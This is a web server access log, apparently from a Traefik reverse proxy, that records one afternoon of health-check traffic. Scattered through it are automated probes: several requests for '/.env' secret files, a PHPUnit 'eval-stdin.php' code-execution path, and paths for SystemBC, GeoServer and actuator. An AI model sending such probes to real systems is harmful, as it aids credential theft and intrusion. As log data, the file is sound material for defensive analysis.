159.203.109.206 - - [14/Dec/2023:13:46:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2141 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:46:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2142 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:47:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2143 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:13:47:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2144 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:48:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2145 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:48:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2146 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:49:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2147 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:49:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2148 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:50:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2149 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:13:50:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2150 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:51:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2151 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:51:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2152 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:13:52:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2153 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:13:52:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2154 "www@docker" "http://172.25.0.8:80" 0ms
167.94.146.59 - - [14/Dec/2023:13:52:39 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2155 "-" "-" 0ms
167.94.146.59 - - [14/Dec/2023:13:52:42 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2156 "-" "-" 0ms
192.241.203.37 - - [14/Dec/2023:13:52:51 +0000] "GET /actuator/health HTTP/1.1" 301 17 "-" "-" 2157 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:13:53:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2158 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2159 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:54:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2160 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:54:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2161 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:55:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2162 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:13:55:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2163 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:13:56:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2164 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:13:56:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2165 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:13:57:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2166 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:57:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2167 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:13:58:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2168 "www@docker" "http://172.25.0.8:80" 0ms
64.62.197.70 - - [14/Dec/2023:13:58:27 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2169 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:13:58:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2170 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:13:59:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2171 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:13:59:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2172 "www@docker" "http://172.25.0.8:80" 0ms
64.62.197.64 - - [14/Dec/2023:13:59:54 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2173 "web-to-websecure@internal" "-" 0ms
64.62.197.74 - - [14/Dec/2023:13:59:54 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2174 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:14:00:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2175 "www@docker" "http://172.25.0.8:80" 1ms
64.62.197.72 - - [14/Dec/2023:14:00:25 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 2176 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:14:00:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2177 "www@docker" "http://172.25.0.8:80" 1ms
64.62.197.74 - - [14/Dec/2023:14:01:00 +0000] "GET /geoserver/web/ HTTP/1.1" 301 17 "-" "-" 2178 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:14:01:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2179 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:14:01:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2180 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:02:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2181 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:02:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2182 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:14:03:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2183 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:14:03:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2184 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:14:04:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2185 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:04:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2186 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:14:05:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2187 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:14:05:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2188 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:06:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2189 "www@docker" "http://172.25.0.8:80" 0ms
54.37.79.75 - - [14/Dec/2023:14:06:38 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2190 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [14/Dec/2023:14:06:38 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2191 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:14:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2192 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:07:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2193 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:14:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2194 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:08:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2195 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2196 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:14:09:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2197 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2198 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:10:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2199 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:14:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2200 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:11:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2201 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2202 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:12:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2203 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2204 "www@docker" "http://172.25.0.8:80" 0ms
20.40.217.3 - - [14/Dec/2023:14:13:22 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2205 "web-to-websecure@internal" "-" 0ms
20.40.217.3 - - [14/Dec/2023:14:13:22 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2206 "web-to-websecure@internal" "-" 0ms
20.40.217.3 - - [14/Dec/2023:14:13:24 +0000] "GET /.env HTTP/1.1" 404 19 "-" "-" 2207 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:14:13:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2208 "www@docker" "http://172.25.0.8:80" 0ms
20.40.217.3 - - [14/Dec/2023:14:13:24 +0000] "POST / HTTP/1.1" 404 19 "-" "-" 2209 "-" "-" 0ms
20.40.217.3 - - [14/Dec/2023:14:13:25 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 17 "-" "-" 2210 "web-to-websecure@internal" "-" 0ms
20.40.217.3 - - [14/Dec/2023:14:13:25 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 19 "-" "-" 2211 "-" "-" 0ms
167.71.120.76 - - [14/Dec/2023:14:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2212 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:14:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2213 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2214 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:14:15:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2215 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2216 "www@docker" "http://172.25.0.8:80" 1ms
143.110.222.166 - - [14/Dec/2023:14:15:43 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2217 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:14:16:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2218 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2219 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:17:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2220 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:14:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2221 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:14:18:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2222 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2223 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:19:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2224 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2225 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:20:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2226 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2227 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:21:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2228 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:14:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2229 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:22:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2230 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:14:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2231 "www@docker" "http://172.25.0.8:80" 0ms
95.214.235.169 - - [14/Dec/2023:14:22:39 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2232 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [14/Dec/2023:14:22:40 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2233 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:14:23:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2234 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2235 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:24:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2236 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2237 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:14:25:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2238 "www@docker" "http://172.25.0.8:80" 0ms
101.68.4.161 - - [14/Dec/2023:14:25:37 +0000] "GET / HTTP/1.0" 404 19 "-" "-" 2239 "-" "-" 0ms
167.71.120.76 - - [14/Dec/2023:14:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2240 "www@docker" "http://172.25.0.8:80" 0ms
43.248.108.33 - - [14/Dec/2023:14:26:20 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2241 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:14:26:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2242 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:14:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2243 "www@docker" "http://172.25.0.8:80" 1ms
185.224.128.191 - - [14/Dec/2023:14:26:53 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2244 "web-to-websecure@internal" "-" 0ms
143.110.222.166 - - [14/Dec/2023:14:27:11 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2245 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:14:27:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2246 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2247 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:28:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2248 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2249 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:14:29:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2250 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:14:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2251 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:30:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2252 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:14:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2253 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:14:31:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2254 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2255 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:14:32:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2256 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2257 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:33:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2258 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:14:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2259 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:14:34:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2260 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:14:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2261 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:35:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2262 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2263 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:14:36:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2264 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2265 "www@docker" "http://172.25.0.8:80" 0ms
54.36.115.221 - - [14/Dec/2023:14:36:53 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2266 "web-to-websecure@internal" "-" 0ms
54.36.115.221 - - [14/Dec/2023:14:36:53 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2267 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:14:37:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2268 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:14:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2269 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:38:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2270 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:38:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2271 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:39:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2272 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2273 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:40:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2274 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:14:40:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2275 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:14:41:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2276 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2277 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:14:42:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2278 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:14:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2279 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:43:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2280 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2281 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:44:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2282 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:44:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2283 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:45:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2284 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:14:45:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2285 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:46:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2286 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:46:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2287 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:47:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2288 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:14:47:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2289 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:14:48:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2290 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:48:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2291 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:49:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2292 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:49:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2293 "www@docker" "http://172.25.0.8:80" 0ms
64.23.136.190 - - [14/Dec/2023:14:49:52 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2294 "web-to-websecure@internal" "-" 0ms
64.23.136.190 - - [14/Dec/2023:14:49:52 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 2295 "-" "-" 0ms
64.23.136.190 - - [14/Dec/2023:14:49:53 +0000] "GET /systembc/password.php HTTP/1.1" 301 17 "-" "-" 2296 "web-to-websecure@internal" "-" 0ms
64.23.136.190 - - [14/Dec/2023:14:49:53 +0000] "GET /systembc/password.php HTTP/1.1" 404 19 "-" "-" 2297 "-" "-" 0ms
64.23.136.190 - - [14/Dec/2023:14:49:53 +0000] "GET /Ep1v HTTP/1.1" 301 17 "-" "-" 2298 "web-to-websecure@internal" "-" 0ms
64.23.136.190 - - [14/Dec/2023:14:49:53 +0000] "GET /Ep1v HTTP/1.1" 404 19 "-" "-" 2299 "-" "-" 0ms
64.23.136.190 - - [14/Dec/2023:14:49:53 +0000] "GET /GWqN HTTP/1.1" 301 17 "-" "-" 2300 "web-to-websecure@internal" "-" 0ms
64.23.136.190 - - [14/Dec/2023:14:49:54 +0000] "GET /GWqN HTTP/1.1" 404 19 "-" "-" 2301 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:14:50:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2302 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:50:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2303 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:51:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2304 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:51:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2305 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:52:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2306 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:14:52:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2307 "www@docker" "http://172.25.0.8:80" 0ms
95.214.235.169 - - [14/Dec/2023:14:53:23 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 2308 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:14:53:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2309 "www@docker" "http://172.25.0.8:80" 0ms
95.214.235.169 - - [14/Dec/2023:14:53:24 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 2310 "web-to-websecure@internal" "-" 0ms
194.187.176.95 - - [14/Dec/2023:14:53:33 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 2311 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:14:53:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2312 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:14:54:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2313 "www@docker" "http://172.25.0.8:80" 0ms
89.187.178.158 - - [14/Dec/2023:14:54:38 +0000] "GET /trace/ HTTP/2.0" 200 768 "-" "-" 2314 "livetrace@docker" "http://172.25.0.5:80" 11ms
89.187.178.158 - - [14/Dec/2023:14:54:38 +0000] "GET /trace/script.js HTTP/2.0" 304 0 "-" "-" 2315 "livetrace@docker" "http://172.25.0.5:80" 0ms
89.187.178.158 - - [14/Dec/2023:14:54:38 +0000] "GET /trace/styles.css HTTP/2.0" 304 0 "-" "-" 2316 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:14:54:38 +0000] "GET /trace/start.php?id=pf1ydwftp HTTP/2.0" 200 104 "-" "-" 2317 "livetrace@docker" "http://172.25.0.5:80" 3ms
167.71.120.76 - - [14/Dec/2023:14:54:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 2318 "www@docker" "http://172.25.0.8:80" 0ms
89.187.178.158 - - [14/Dec/2023:14:54:39 +0000] "GET /trace/poll.php?id=pf1ydwftp HTTP/2.0" 200 233 "-" "-" 2319 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:14:54:40 +0000] "GET /trace/poll.php?id=pf1ydwftp HTTP/2.0" 200 307 "-" "-" 2320 "livetrace@docker" "http://172.25.0.5:80" 1ms
89.187.178.158 - - [14/Dec/2023:14:54:41 +0000] "GET /trace/poll.php?id=pf1ydwftp HTTP/2.0" 200 381 "-" "-" 2321 "livetrace@docker" "http://172.25.0.5:80" 2ms
89.187.178.158 - - [14/Dec/2023:14:54:42 +0000] "GET /trace/poll.php?id=pf1ydwftp HTTP/2.0" 200 455 "-" "-" 2322 "livetrace@docker" "http://172.25.0.5:80" 1ms
